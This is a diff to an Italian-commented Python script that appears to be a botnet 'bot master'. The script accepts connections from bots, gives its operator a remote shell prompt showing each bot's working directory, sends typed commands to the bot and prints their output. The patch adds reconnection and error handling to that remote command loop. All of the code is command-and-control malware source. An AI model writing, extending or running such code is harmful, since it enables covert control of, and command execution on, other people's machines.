@@ -12,6 +12,7 @@ def invia_messaggio(messaggio):
     global connectionSocket
     try:
         connectionSocket.send(messaggio.encode())
+        return True
     except Exception as e:
         #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
         print (str(e.errno))
@@ -19,6 +20,8 @@ def invia_messaggio(messaggio):
         connectionSocket.close()
         connectionSocket, addr = serverSocket.accept()
         print ("Messaggio non inviato, bot master connesso ad un bot con indirizzo" + str(addr))
+        cwd = ricevi_messaggio()
+        return False
 
 
 def ricevi_stampa_messaggio():
@@ -37,6 +40,7 @@ def ricevi_messaggio():
         connectionSocket.close()
         connectionSocket, addr = serverSocket.accept()
         print ("Messaggio non ricevuto, bot master connesso ad un bot con indirizzo" + str(addr))
+        cwd = ricevi_messaggio()
         
 def menu():
     print("\nScegliere l'operazione da eseguire:\n"
@@ -62,7 +66,7 @@ while True:
             while cmd.lower() != "exit": #Finche non scegliamo di uscire dalla bash
                 cmd = input(f"{cwd}$>") #stampiamo la cwd, prendiamo il comando da eseguire e lo mandiamo
                 if cmd.lower() != "exit":
-                    invia_messaggio(f"6<sep>{cmd}")
+                    if (not(invia_messaggio(f"6<sep>{cmd}"))): break
                     output = ricevi_messaggio()
                     queryRes, cwd = output.split('<sep>')
                     print(queryRes + "\n")
